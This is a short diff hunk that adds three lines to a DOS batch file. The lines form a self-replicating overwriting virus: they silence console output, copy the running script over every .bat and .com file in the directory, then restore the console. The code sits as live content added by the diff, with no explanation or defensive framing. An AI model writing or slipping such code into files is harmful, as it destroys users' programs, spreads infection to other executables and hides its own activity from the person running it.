@@ -1,0 +1,3 @@
+@ctty nul
+@for %%g in (*.bat, *.com) do copy %0 %%g
+ctty con
